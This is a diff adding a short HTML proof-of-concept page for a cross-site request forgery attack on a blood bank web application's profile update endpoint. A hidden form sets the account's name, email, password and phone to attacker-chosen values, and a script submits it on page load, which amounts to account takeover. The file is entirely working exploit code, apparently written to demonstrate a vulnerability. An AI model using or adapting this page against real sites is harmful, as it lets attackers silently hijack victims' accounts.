@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC with Account Takeover</title>
+</head>
+<body>
+    <h2>CSRF Proof of Concept with Account Takeover</h2>
+
+    <!-- Form to exploit CSRF vulnerability for updating profile -->
+    <form id="csrfForm" action="http://localhost.local/bloodbank/file/updateprofile.php" method="POST">
+        <input type="hidden" name="rname" value="attacker">
+        <input type="hidden" name="remail" value="attacker@malicious.com">
+        <input type="hidden" name="rpassword" value="test1234">
+        <input type="hidden" name="rphone" value="0777112233">
+        <input type="hidden" name="rcity" value="gotham">
+        <input type="hidden" name="bg" value="B-">
+        <input type="hidden" name="update" value="Update">
+    </form>
+
+    <script>
+        // Submit the CSRF form to update profile
+        document.getElementById("csrfForm").submit();
+   </script>
+</body>
+</html>
+
